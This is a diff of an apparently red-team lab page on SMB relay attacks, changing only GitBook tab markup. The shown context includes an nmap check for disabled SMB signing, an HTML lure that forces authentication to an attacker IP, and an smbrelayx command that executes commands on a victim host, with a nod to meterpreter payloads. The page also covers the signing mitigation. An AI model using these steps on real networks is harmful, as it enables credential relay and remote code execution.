@@ -24,28 +24,28 @@ Below is a simplified process of how this attack works:
 
 One of the ways to check if SMB signing is `disabled` on an endpoint:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 nmap -p 445 10.0.0.6 -sS --script smb-security-mode.nse
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-31-10-45-27.png)
 
 Since we know that victim2@10.0.0.6 has SMB signing disabled and is vulnerable to SMB relaying attack, let's create a simple HTML file that once opened will force the victim1 to authenticate to attacker's machine:
 
-{% code-tabs %}
-{% code-tabs-item title="message.html" %}
+{% tabs %}
+{% tab title="message.html" %}
 ```markup
 <html>
     <h1>holla good sir</h1>
     <img src="file://10.0.0.5/download.jpg">
 </html>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 {% hint style="info" %}
 Any other forced authentication method will also work - follow below link for a list of techniques.
@@ -55,13 +55,13 @@ Any other forced authentication method will also work - follow below link for a 
 
 ...at the same time, let's fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them to victim2@10.0.0.6 and will attempt to execute a command `ipconfig`on the end host:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```text
 smbrelayx.py -h 10.0.0.6 -c "ipconfig"
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 {% hint style="info" %}
 Note that smbrelayx could be used with a `-e` switch that allows attacker to execute their payload file - say, a meterpreter executable.
@@ -91,13 +91,13 @@ With the above change, trying to execute the same attack, we get `Signature is R
 
 The same nmap scan we did earlier now also shows that the `message signing is required`:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 nmap -p 445 10.0.0.6 -sS --script smb-security-mode
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-31-11-05-59.png)
 
